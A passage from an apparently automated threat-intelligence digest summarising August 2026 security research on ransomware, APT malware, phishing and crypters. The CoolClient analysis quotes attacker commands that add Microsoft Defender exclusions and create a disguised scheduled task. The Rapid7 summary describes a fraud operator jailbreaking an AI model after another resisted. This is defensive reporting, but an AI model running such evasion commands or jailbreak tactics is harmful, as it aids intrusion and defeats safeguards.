to automate additional stages of cyberespionage activity. Researchers found that encrypted reasoning blocks used by OpenAI, Anthropic, and Google APIs could be replayed across sessions. Analysis of more than 315,000 blocks recovered hundreds of sensitive artifacts from published agent logs, including API keys, passwords, authentication tokens, and private cryptographic keys. VULNERABILITIES AND PATCHES Microsoft has released its August Patch Tuesday security updates, addressing 421 vulnerabilities across Windows, Office, SharePoint, Exchange Server, Azure and other products. The fixes include 42 critical flaws and CVE-2026-68820, an actively exploited Windows Ancillary Function Driver for WinSock vulnerability that allows local attackers to gain SYSTEM privileges. Apple released patches for CVE-2026-65400, a critical macOS Screen Sharing authentication vulnerability with a CVSS score of 9.8. The flaw allows network attackers to authenticate without valid credentials. Active exploitation against internet-exposed systems has resulted in root access and deployment of Monero cryptocurrency miners. Adobe released a fix for CVE-2026-71362, a critical authentication vulnerability affecting Adobe Commerce and Magento Open Source. Attackers began exploiting the flaw shortly after public disclosure. Successful exploitation enables unauthorized session switching, potentially allowing account takeover and access to information associated with affected accounts. Zoom addressed three critical vulnerabilities in Zoom Workplace, including CVE-2026-53413, that could enable remote code execution during a meeting. The flaws
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 17th August – Threat Intelligence Report
  - Published: 2026-08-17T13:37:34+00:00
  - Link: https://research.checkpoint.com/2026/17th-august-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 17th August, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Colombia’s Ministry of Justice has experienced a ransomware attack that affected part of its technology infrastructure and disrupted public services related to illicit-drug monitoring and legal processes. Officials confirmed that some files were […] The post 17th August – Threat Intelligence Report appeared first on Check Point Research .

### Cluster 2a12c51464 — score 10

- Title: The State of Ransomware Q2 2026
- Source: Check Point Research (threat_research_primary)
- Published: 2026-08-13T12:54:35+00:00
- Link: https://research.checkpoint.com/2026/the-state-of-ransomware-q2-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, data_breach, ransomware_extortion
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, credential_theft, data_breach
- affected_industries: financial_services
- affected_products: Android, OpenAI/ChatGPT
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the past year, the ransomware conversation has centered on concentration: a handful of dominant RaaS operations controlling most of the damage, and a shrinking pool of active groups fighting over the same territory. The State of Ransomware Q2 2026 report from Check Point Research shows that picture starting to shift. The leaders are still winning, but […] The post The State of Ransomware Q2 2026 appeared first on Check Point Research .
```

#### Full body

```
CATEGORIES AI Research 18 Android Malware 23 Artificial Intelligence 5 ChatGPT 3 Check Point Research Publications 467 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 2 Data Analysis 0 Demos 22 Global Cyber Attack Reports 421 How To Guides 13 Ransomware 6 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 175 Web 3.0 Security 11 Wipers 0 The State of Ransomware Q2 2026 August 13, 2026 https://research.checkpoint.com/2026/the-state-of-ransomware-q2-2026/ For the past year, the ransomware conversation has centered on concentration: a handful of dominant RaaS operations controlling most of the damage, and a shrinking pool of active groups fighting over the same territory. The State of Ransomware Q2 2026 report from Check Point Research shows that picture starting to shift. The leaders are still winning, but the road to joining them has gotten a great deal shorter. Key observed findings The ecosystem stayed concentrated even as its tail widened considerably. The top 10 groups accounted for 57.6% of all victims, down from 71% in Q1, while the number of active groups climbed from 71 to 93, a new high for the period tracked in this report. Victim volume held at an elevated baseline and did not meaningfully change QoQ. Data leak sites recorded 2,139 victims in Q2, essentially flat versus Q1 (up 0.8%) and up 33% year over year, keeping pace with the highs set through 2025. Qilin and The Gentlemen fought a close race for the top spot all quarter. Qilin remained the most prolific operator for a fourth straight quarter with 279 victims, though its count fell 17%, while The Gentlemen surged 62% to 269 victims and actually outpaced Qilin during the month of June. An internal leak gave an unprecedented look inside The Gentlemen’s operation. Chat logs and platform data exposed a core team of roughly nine operators supported by a broader affiliate base, along with confirmation that the group used AI coding assistants to build its ransomware management panel in about three days, genuine first party evidence of AI accelerating malicious tooling development. Ransom payment rates fell to a multi year low near 23%, continuing a six year decline from 85% in 2019. Even so, on chain ransomware payments still exceeded $820 million in 2025, and the payer market itself is splitting: average payments are rising even as the median falls, a sign that large enterprises keep paying heavily while the mid market increasingly holds firm or settles small. Law enforcement concentrated its Q2 efforts on shared infrastructure rather than individual groups. Actions took down a cryptocurrency laundering platform used by multiple ransomware actors, prompted sanctions against major Iranian digital asset exchanges, dismantled a malware signing service abused by several RaaS operations, and disrupted large infostealer and VPN anonymization networks that many groups depend on at once. The geographic picture shifted meaningfully. The US share of victims fell from 50% to 42% quarter over quarter, largely because the quarter’s fastest growing groups, including The Gentlemen and the newly active Krybit, target the US far less often than the ecosystem average. The exploitation window kept narrowing, with AI increasingly cited as the accelerant. Vulnerabilities are now being weaponized within hours to days of disclosure, lowering the cost of exploit development and giving ransomware operators one more edge in the race to reach victims first. To read the full findings, access the State of Ransomware Q2 2026 report from Check Point Research here . GO UP BACK TO ALL POSTS POPULAR POSTS Artificial Intelligence ChatGPT Check Point Research Publications OPWNAI : Cybercriminals Starting to Use ChatGPT Check Point Research Publications Threat Research Hacking Fortnite Accounts Artificial Intelligence ChatGPT Check Point Research Publications OpwnAI: AI That Can Save the Day or HACK it Away BLOGS AND PUBLICATIONS Check Point Research Public
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: The State of Ransomware Q2 2026
  - Published: 2026-08-13T12:54:35+00:00
  - Link: https://research.checkpoint.com/2026/the-state-of-ransomware-q2-2026/
  - Summary: For the past year, the ransomware conversation has centered on concentration: a handful of dominant RaaS operations controlling most of the damage, and a shrinking pool of active groups fighting over the same territory. The State of Ransomware Q2 2026 report from Check Point Research shows that picture starting to shift. The leaders are still winning, but […] The post The State of Ransomware Q2 2026 appeared first on Check Point Research .

### Cluster 21cbe0b5fa — score 10

- Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-08-14T09:00:14+00:00
- Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- actor_attribution: Mustang Panda
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- actor_attribution: Mustang Panda
- affected_products: Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
```

#### Full body

```
Table of Contents Introduction Technical analysis CoolClient components First stage: libngs.dll Second stage: loadcert.ini (before synchost.exe injection) Command handler Establishing AutoRun persistence Process injection into synchost.exe Service installation Administrator privilege check Elevated relaunch and UAC bypass Second stage: loadcert.ini (Injected Execution) Kernel-Mode driver deployment Driver initialization Cert.ini process injection Msagent.sys driver Driver configuration Preparation for process hiding Process, object, and image load callbacks Object callbacks Process and image load callbacks MiniFilter registration Registry callback registration IOCTL command dispatcher Kernel module enumeration and hiding Nsiproxy hooking and data filtering Victimology Attribution Conclusion IOCs Authors Fareed Radzi Introduction CoolClient is a backdoor family attributed to the HoneyMyte APT group (also known as Mustang Panda) that has been used in their cyber-espionage campaigns targeting organizations across Asia and Russia. It supports such capabilities as keylogging, clipboard theft, credential harvesting, file management, system reconnaissance, and plugin-based extensions. Since its first public disclosure by Sophos in 2022 and subsequent analysis by Trend Micro in 2023 , CoolClient has continued to evolve. In 2025 , we analyzed a newer variant that introduced clipboard theft and HTTP traffic interception for credential harvesting. In late 2025 and 2026, our latest investigation reveal another major evolution. The newest CoolClient variant can deploy a signed kernel-mode driver as a Windows service and communicate with it through IOCTL requests. The driver enhances the malware’s stealth by hiding the CoolClient process, protecting related files and registry entries, and preventing them from being inspected or modified. The overall design is comparable to the kernel-mode enhancements previously observed in ToneShell , but the CoolClient driver exposes dedicated IOCTL handlers that allow the user-mode backdoor to communicate directly with the driver. We have observed this updated CoolClient variant and its accompanying driver in intrusions across multiple countries in Asia, including Pakistan, Mongolia, and Myanmar. Technical analysis In the observed campaign targeting Myanmar, HoneyMyte used PlugX as the initial post-compromise implant to deploy the CoolClient components. Before deploying the malware, the actor added both a folder exclusion and a file exclusion to Microsoft Defender for the fake Windows Defender installation directory and the renamed sideloader executable ( defender.exe ). wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender" wmic /Node:localhost /Namespace:\\Root\Microsoft\Windows\Defender Path MSFT_MpPreference call Add ExclusionPath="$programfiles\Microsoft\Windows Defender\defender.exe" 1 2 wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender" wmic / Node : localhost / Namespace : \ \ Root \ Microsoft \ Windows \ Defender Path MSFT_MpPreference call Add ExclusionPath = "$programfiles\Microsoft\Windows Defender\defender.exe" The actor then created a fake Windows Defender installation directory, copied the CoolClient components into it, and renamed a legitimate Sangfor executable, usually named Sang.exe , to defender.exe to serve as the DLL sideloader. xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" /a /s /v /e /f 1 xcopy "$programfiles\Windows Defender\*" "$programfiles\Microsoft\Windows Defender" / a / s / v / e / f Persistence was established through a scheduled task that launched defender.exe with SYSTEM privileges during system startup. schtasks /create /sc onstart /tn "\Microsoft\Windows\Windows Defender Advanced Threat Protection Service" /tr "\"$p
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: APT group HoneyMyte upgrades CoolClient: the backdoor gets a kernel-level Windows rootkit
  - Published: 2026-08-14T09:00:14+00:00
  - Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
  - Summary: Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.

### Cluster 1e8cbb1e90 — score 10

- Title: Armored Likho expands its cyber-espionage toolkit
- Source: Kaspersky Securelist (threat_research_primary)
- Published: 2026-08-13T08:00:15+00:00
- Link: https://securelist.com/armored-likho-still-toolkit/121033/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, web_shell_backdoor
- affected_industries: education, government
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: apt_espionage, web_shell_backdoor
- affected_industries: government, education
- content_type: threat_research
- confidence_tier: tier_1_primary_research

#### Summary

```
Kaspersky experts break down a new Armored Likho campaign that poses as a fundraising efforts and delivers a new Still Toolkit aimed at stealing Telegram data and eavesdropping on victims.
```

#### Full body

```
Table of Contents Background Initial infection Still Sync How it works Telegram data collection Still Audio The eavesdropping process Infrastructure Victims Attribution Takeaways Indicators of compromise Authors Konstantin Isakov In May 2026, we discovered a new cyber-espionage campaign by the Armored Likho group, also known as Eagle Werewolf, that targets private individuals and organizations across various industries in Russia, including major corporations, the public sector, IT, and education. The attackers used a fake app as bait that mimics a service for donations. However, the most interesting part of this campaign isn’t the initial infection method – it’s the malicious implants the attackers use for cyber-espionage. We’ve written previously about recent Armored Likho attacks, but our analysis shows that the campaign discussed below has more in common with the group’s activity from February . That said, the attackers have significantly expanded their arsenal. During our research, we found a new cyber-espionage toolkit written in Rust: the Still Toolkit . One of its components, Still Sync , steals Telegram session data to gain ongoing access to the victim’s account. With this stolen data, attackers can leverage the Telegram API to automatically pull chat logs, media files, and other information from the account. The second component, Still Audio , is an implant for covert audio surveillance. It analyzes the incoming audio stream, automatically detects speech, records conversations, and sends the recordings to a command-and-control server. In this article, we’ll look at the initial infection method, how the new Still Toolkit components are built, and the technical details of how they operate. Kaspersky products detect this threat as Trojan.Win64.Agent.* and HEUR:Backdoor.Win32.Generic . Background Armored Likho’s malicious activity has been documented several times before: in November 2024, and in February and July 2026. The current campaign shows significant overlap with the November and February campaigns, which used malicious droppers disguised as documents and applications related to Starlink activation or fundraising efforts as the initial infection vector. This campaign also uses fundraising as its lure. At the same time, our research uncovered a number of new tools that point to the attackers expanding their capabilities. Initial infection The infection chain starts with an app that mimics a donation service. As of this writing, the app distribution method remains unknown. During our research, however, we obtained several samples posing as apps from different Russian foundations. In reality, the app is a dropper. Its developers wrote it in Rust on top of the popular Tauri framework, and it has a graphical interface designed to deceive the user. After launch, it displays a login form that asks for a password, presumably one the attackers supplied. The login form After the user enters a valid password, they see a catalog of donatable items. The app pulls item and category information from orderapiserver[.]info through the public/categories and public/products endpoints . A clickable catalog makes the app look legitimate. While the user browses the items, the dropper quietly decrypts and launches the payload for the next stage in the background. Our analysis shows that the mechanism for decrypting the payload and launching subsequent stages hasn’t changed since the February campaign. However, we found a new cyber-espionage toolkit – the Still Toolkit – made up of two components: Still Sync and Still Audio. Still Sync Still Sync is a stealer written in Rust that steals Telegram session data. However, its capabilities don’t stop there. With this stolen data, Sync can log in to the victim’s account and pull messages and media files through the Telegram API. Architecturally, Sync is an asynchronous application based on the Tokio library. It talks to the server over gRPC and serializes messages with FlatBuffers . It support
```

#### Corroborating sources (1)

- **Kaspersky Securelist** (threat_research_primary)
  - Title: Armored Likho expands its cyber-espionage toolkit
  - Published: 2026-08-13T08:00:15+00:00
  - Link: https://securelist.com/armored-likho-still-toolkit/121033/
  - Summary: Kaspersky experts break down a new Armored Likho campaign that poses as a fundraising efforts and delivers a new Still Toolkit aimed at stealing Telegram data and eavesdropping on victims.

### Cluster 452d902ac4 — score 10

- Title: Curiouser and Curiouser
- Source: Cisco Talos (threat_research_primary)
- Published: 2026-08-13T18:00:18+00:00
- Link: https://blog.talosintelligence.com/curiouser-and-curiouser/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: retail_ecommerce
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: retail_ecommerce
- affected_products: Cisco
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
In this edition of the Threat Source newsletter, William reflects on the “Make Hazel a Hacker” segment in Beers with Talos, and how cybersecurity is a field where questions can lead to multiple correct answers.
```

#### Full body

```
Curiouser and Curiouser By William Largent Thursday, August 13, 2026 14:00 Threat Source newsletter Welcome to this week’s edition of the Threat Source newsletter. “Experiment is the mother of knowledge.” ― Madeleine L'Engle, A Wrinkle in Time “Don't slide down the rabbit hole. The way down is a breeze, but climbing back's a battle.” ― Kate Morton, The Clockmaker's Daughter Hacker Summer Camp has come and gone, which means it’s time for you to start planning next year’s trip. I’m surely going to recap Camp Season, right? Nope. One of the things that I’ve really enjoyed lately is a segment on the Beers with Talos podcast that we call “Make Hazel a Hacker.” If you haven’t listened to it, this is a perfect time to start. Each episode we take a few minutes and pose a security question, term, or concept to Hazel and force her to come up with an idea or explanation on the spot. There are no parameters, so she’s faced with the entirety of information security — past, present, and future. I know, it’s insane. The craziest part is that (I think) Hazel came up with this idea and still volunteered to put herself in the line of fire. As we put Hazel’s feet to the fire, one of my favorite things happens: The rest of us listen in and offer our thoughts during her brainstorming process. Invariably, we’ve got three very different answers, ideas, hints, or directions for her. It’s surely maddening for Hazel, but to me, the best part of the discussion that inevitably follows is that although they’re all different, they’re all correct. For example, this past episode I asked her about a behavioral indicator (regarding “wallpaper.bmp”) that seems benign on its own, but can be interesting to use as a pivot for a threat hunt. We had various interesting angles to consider, backed by years of knowledge and experience. It gave us a good conversation, and that was a .bmp! One of the most nebulous things to learn in this field is that multiple things can be both different and correct. When you are making your decisions this week — whether it’s deciding on a new pivot in your hunting, what devices to prioritize in your patching and updating, or which books or online training to focus on — take a quick second and get a second, third, and fourth opinion. Then try something that’s outside of your normal wheelhouse but sounds good when it’s proposed. None of this is a solo sport. It’s a team game and the best plays come from a mix of perspectives, experiences, and mistakes. The “right” answer can wear many faces, and your ability to hold different truths will lead you to undiscovered territory, the rabbit hole where anomaly lives and breathes. So... welcome back from Vegas. Now go down a rabbit hole on a path you wouldn’t normally take because one of your friends (Joe) or your mortal enemy (Dave) told you that it would work. “She'd been to Narnia, Wonderland, Hogwarts, Dictionopolis. She had tessered, fallen through the rabbit hole, crossed the ice bridge into the unknown world beyond.” ― Anne Ursu, Breadcrumbs The one big thing Cisco Talos recently discovered "JWR," a previously undocumented, real-time phishing framework and likely variant of "The Outsider" phishing-as-a-service platform. JWR uses an open WebSocket connection that allows attackers to monitor keystrokes live and dynamically steer victims through fake checkout and login flows. Currently deployed via SMS lures impersonating regional toll and postal authorities, JWR enables operators to steal payment data, 2FA codes, identity documents, and device fingerprints. Why do I care? Because JWR is operator-driven in real time, attackers can actively bypass multi-factor authentication (MFA) by prompting victims for 2FA codes exactly when needed. The sheer volume of collected data gives threat actors a comprehensive identity profile primed for extensive follow-on fraud and network compromise. Furthermore, JWR's seamless integration with legitimate e-commerce platforms like Shopify makes these lures incre
```

#### Corroborating sources (1)

- **Cisco Talos** (threat_research_primary)
  - Title: Curiouser and Curiouser
  - Published: 2026-08-13T18:00:18+00:00
  - Link: https://blog.talosintelligence.com/curiouser-and-curiouser/
  - Summary: In this edition of the Threat Source newsletter, William reflects on the “Make Hazel a Hacker” segment in Beers with Talos, and how cybersecurity is a field where questions can lead to multiple correct answers.

### Cluster 44f04ecb50 — score 10

- Title: Malware Crypting Services and the Threat Actors Who Sell Them
- Source: Recorded Future (threat_research_primary)
- Published: 2026-08-13T00:00:00+00:00
- Link: https://www.recordedfuture.com/research/malware-crypting-services-threat-actors
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.
```

#### Full body

```
Malware Crypting Services and the Threat Actors Who Sell Them Executive Summary Crypting services and products modify malicious payloads to help threat actors bypass detection, complicate analysis, and preserve malware usability after exposure. Although basic crypting consists of encrypting or obfuscating a customer-supplied payload, mature providers increasingly operate as broader malware-enablement services. Their offerings often combine payload wrapping, in-memory execution, anti-analysis checks, process injection, persistence options, delivery packaging, and post-detection “cleaning” or re-crypting services. Insikt Group analyzed 24 threat actors advertising crypting services and products within the past year and identified a market that is competitive, reputation-driven, and heavily focused on Windows payloads. Providers advertise through underground forums, restricted communities, chat platforms, clearnet sites, and social media accounts. They compete through tiered pricing, antivirus (AV) detection scores of crypted samples, discounts, malware-developer partnerships, private or shared stubs, and promised turnaround times for re-crypting detected payloads. Advertised crypter capabilities vary by provider, but the underlying objectives are consistent: reduce detection, delay or prevent analysis, and support stealthier payload execution. Because crypted payloads are designed to defeat both static and dynamic analysis, defenders should prioritize behavioral detection over static indicators. See the Outlook and Mitigations section for details. Key Findings AV and endpoint detection and response (EDR) tools should not be treated as sufficient standalone protection against crypted payloads. Defenders should pair endpoint controls with behavioral detection, telemetry correlation, upstream hunting, suspicious process monitoring, and rapid triage of suspicious samples. Popular crypting service providers primarily advertise support for Windows payloads, with no identified advertising for macOS or Linux crypting services. However, although Windows environments were most frequently targeted by the services reviewed in this report, they are not inherently more susceptible to the execution of crypted payloads. Crypted payloads increase the likelihood of successful malware execution and delayed detection, but they do not independently provide end-to-end intrusion capability. Downstream activities, such as lateral movement, data theft, ransomware deployment, and follow-on compromise, depend on the embedded malware and the operator's objectives. Crypter risk varies significantly with provider maturity and technical capability: advanced crypters offer portability, anti-analysis, process injection, persistence, and security product bypass capabilities, whereas less-advanced crypters generally provide basic payload obfuscation techniques. Crypter capabilities are generally not novel individually, but their commercial packaging makes established defense-evasion tradecraft easier to access, reuse, and operationalize. The significance of crypters lies less in technical innovation than in making mature evasion methods available as paid services. The Crypter Landscape What Is a “Crypter”? “Crypting” is what threat researchers generally refer to as a service or product wherein a file, almost exclusively a malicious executable of some kind, is encrypted to bypass malware detection technologies. The result of a crypting service is a malicious payload that modifies the supplied executable in ways that deter defenders and endpoint security solutions (namely, AV and EDR products) from detecting and analyzing it. How Does Crypting Work? While the core functionality of a crypting service or product is to encrypt a payload, services vary in the capabilities they provide. These capabilities can range from the encryption algorithms used, which are often proprietary, to behavioral adjustments for how the resultant payload will execute in a victim environmen
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: Malware Crypting Services and the Threat Actors Who Sell Them
  - Published: 2026-08-13T00:00:00+00:00
  - Link: https://www.recordedfuture.com/research/malware-crypting-services-threat-actors
  - Summary: Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.

### Cluster 8883aedcfe — score 10

- Title: How QR-code phishing can slip past corporate security measures
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-08-17T09:00:00+00:00
- Link: https://www.welivesecurity.com/en/business-security/qr-code-phishing-slip-past-corporate-security-measures/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap.
```

#### Full body

```
Business Security How QR-code phishing can slip past corporate security measures Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap. Phil Muncaster 17 Aug 2026 • , 5 min. read Familiarity might breed contempt. But in the world of cybersecurity, it also breeds complacency, which can be a lot more dangerous. So it is with QR codes, which have become a common sight on menus, lampposts and parking meters – and, increasingly, in emails over recent years. The challenge is that they’re also a great way to disguise malicious links, bypass some traditional corporate security filters, and to move the interaction from a corporate computer to a personal phone with fewer security controls. Attackers will continue to experiment and innovate with new ways to avoid detection. And new “quishing” techniques to snare unwitting employees. Here’s what you need to understand to keep your organization safe. Why is quishing so dangerous? Short for ‘Quick Response’, a QR code is a two-dimensional barcode that can encode URLs, payment details, contact information and other data, helping users get quickly from A to B – the destination in this case usually being a website or app. They appeal to threat actors for several reasons. Their widespread use, accelerated by the demand for contactless interactions during the pandemic, has made scanning them an ordinary part of daily life. That means we’re more likely to get our phones out to scan them today than a few years back. They also slot neatly into phishing workflows – just replace that malicious link or attachment with a QR code. And they can be generated in seconds. In fact, many phishing kits will have a dedicated QR-code generator. Most importantly, they take the victim from a relatively well-protected corporate environment to a potentially unmanaged mobile device, thus bypassing business-grade security. One important advantage for the attacker is concealment. The destination is encoded in a visual pattern, not displayed as readable text, which hides the malicious URLs behind them so that some traditional email filters can’t extract and inspect them. Sometimes they’re further obfuscated by being embedded in PDF or JPEG attachments. That means they’re more likely to end up in your employees’ inboxes. And when they do, your staff may struggle to discern a real message from a malicious one. There’s typically not much text to analyze for typos or grammatical mistakes. And because the link is effectively encoded in a visual pattern, it’s invisible to the human eye. If used in conjunction with a trusted brand – say, a DocuSign email or an update from Microsoft – the quishing attack leverages similar social engineering tactics as classic phishing messages. Trusted branding reassures the victim that they can click through. And a sense of urgency is often created by the pretext. Malicious QR codes are frequently embedded in alerts urging users to secure their account, or authenticate to confirm their details. In fact, according to the ESET Threat Report H1 2026 , malicious QR codes were embedded in no fewer than 11 percent of all phishing email in the first half of 2026. “ESET tracks quishing emails under the detection name QRCode/Phishing. This detection works through a dedicated layer of the ESET email scanner, designed to identify QR codes in the vast majority of file types, and to decode the URLs in them. The extracted URLs are scanned using ESET anti-phishing, anti-malware, and anti-spam engines; any harmful URLs are blocked, and the associated emails flagged or deleted,” says the report. QRCode/Phishing detection trend from September 2025 to May 2026, seven-day moving average (source: ESET Threat Report H1 2026 ) Threat actors continue to innovate As with any threat landscape trend, malicious actors continue to hone their efforts for maximum impact. Quishing attacks are being used not only to install malware and steal credentials but also harvest MFA
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: How QR-code phishing can slip past corporate security measures
  - Published: 2026-08-17T09:00:00+00:00
  - Link: https://www.welivesecurity.com/en/business-security/qr-code-phishing-slip-past-corporate-security-measures/
  - Summary: Quishing has become a popular alternative to traditional phishing. Here’s how businesses can close the gap.

### Cluster 6cf2dd574b — score 10

- Title: Operation ASTERIX: Anatomy of a Crypto Fraud Pipeline
- Source: Rapid7 (offensive_vulnerability_research)
- Published: 2026-08-17T11:29:31+00:00
- Link: https://www.rapid7.com/blog/post/tr-operation-asterix-crypto-fraud-vishing-phishing
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services
- content_type: news_report
- confidence_tier: tier_1_offensive_research

#### Summary

```
Operation ASTERIX overview Rapid7 researchers identified an exposed web directory on infrastructure used to support a cryptocurrency fraud operation. The server contained raw phone-number datasets, account-validation tools, enriched lead records, phishing panels, voice-dialing scripts, fake wallet applications, persistence mechanisms, and Telegram exfiltration code. Among the artifacts was evidence that the operator relied on AI coding assistants throughout the campaign's development; recovered prompts, shell history, and project files show AI being used to package Electron applications, obfuscate code, troubleshoot builds, modify phishing infrastructure, and prepare malware for distribution. When one model began resisting parts of that workflow, the operator switched providers and attempted to bypass the next model's safety controls with a custom jailbreak prompt. Together, these artifacts provide an unusual view into how AI was integrated into the development of an active phishing op
```

#### Full body

```
Back to Blog Threat Research Operation ASTERIX: Anatomy of a Crypto Fraud Pipeline Anna Širokova | Jan Recinsky Aug 17, 2026 | Last updated on Aug 17, 2026 | 22 min read DISCOVER RAPID7 MDR Operation ASTERIX overview Rapid7 researchers identified an exposed web directory on infrastructure used to support a cryptocurrency fraud operation. The server contained raw phone-number datasets, account-validation tools, enriched lead records, phishing panels, voice-dialing scripts, fake wallet applications, persistence mechanisms, and Telegram exfiltration code. Among the artifacts was evidence that the operator relied on AI coding assistants throughout the campaign's development; recovered prompts, shell history, and project files show AI being used to package Electron applications, obfuscate code, troubleshoot builds, modify phishing infrastructure, and prepare malware for distribution. When one model began resisting parts of that workflow, the operator switched providers and attempted to bypass the next model's safety controls with a custom jailbreak prompt. Together, these artifacts provide an unusual view into how AI was integrated into the development of an active phishing operation rather than simply being used to generate isolated snippets of code. We track this activity as Operation ASTERIX, named after the Asterisk open-source telephony platform recovered on the server. The operator used Asterisk to automate the campaign's vishing infrastructure, coordinating phone calls with phishing emails and counterfeit wallet applications. The recovered material shows how the operator combined several techniques: Bulk account enumeration against cryptocurrency platforms Phishing emails that created fake support cases Vishing calls that referenced details from those emails Counterfeit Ledger, Trezor, and Exodus applications Seed-phrase theft and Telegram exfiltration AI-assisted development, including an attempt to bypass an LLM’s safety controls Much of the value around this finding is timing. Much of the infrastructure was still in use or under development when it was exposed. This allowed Rapid7 Labs to notify the appropriate providers and authorities while the operation was still active, while also documenting the campaign's tooling and development process. Rapid7 Labs disclosed the identified infrastructure and findings to the relevant authorities, including Apple's security team, and collaborated with them to support action against the activity described in this report. Technical analysis and observed attacker behavior The recovered files show a multi-stage operation designed to focus social engineering on confirmed cryptocurrency users. The attacker used account-checking tools to confirm which phone numbers were tied to active crypto exchange accounts, narrowing a raw dataset down to confirmed holders. From there, the recovered infrastructure supported multiple outreach channels. The phishing panels generated fake support cases and verification codes that were later referenced during phone calls, while files such as extract_sg_numbers.py and sg_leads_server.py suggest additional lead-management and direct-outreach capabilities. Although call logs were not recovered to reconstruct every interaction, the recovered artifacts indicate that these channels ultimately directed victims toward counterfeit wallet applications designed to steal recovery phrases. Figure 1: Operation ASTERIX kill chain from acquisition to exfiltration ⠀ Each stage narrowed the target pool or increased trust before the operator asked the user to install software or provide wallet recovery information. That structure is important for defenders, as it creates several points where the campaign can be detected or interrupted before seed phrases are stolen. Account validation The server had approximately 885,000 phone numbers organized into multiple files by region and source. The largest file included 316,002 German mobile numbers, with additional lists covering Hong
```

#### Corroborating sources (1)

- **Rapid7** (offensive_vulnerability_research)
  - Title: Operation ASTERIX: Anatomy of a Crypto Fraud Pipeline
  - Published: 2026-08-17T11:29:31+00:00
  - Link: https://www.rapid7.com/blog/post/tr-operation-asterix-crypto-fraud-vishing-phishing
  - Summary: Operation ASTERIX overview Rapid7 researchers identified an exposed web directory on infrastructure used to support a cryptocurrency fraud operation. The server contained raw phone-number datasets, account-validation tools, enriched lead records, phishing panels, voice-dialing scripts, fake wallet applications, persistence mechanisms, and Telegram exfiltration code. Among the artifacts was evidence that the operator relied on AI coding assistants throughout the campaign's development; recovered prompts, shell history, and project files show AI being used to package Electron applications, obfuscate code, troubleshoot builds, modify phishing infrastructure, and prepare malware for distribution. When one model began resisting parts of that workflow, the operator switched providers and attempted to bypass the next model's safety controls with a custom jailbreak prompt. Together, these artifacts provide an unusual view into how AI was integrated into the development of an active phishing op

### Cluster 272e108269 — score 10

- Title: AI is Working in the SOC. So Why are Security Executives More Worried Than Ever?
- Source: Rapid7 (offensive_vulnerability_research)
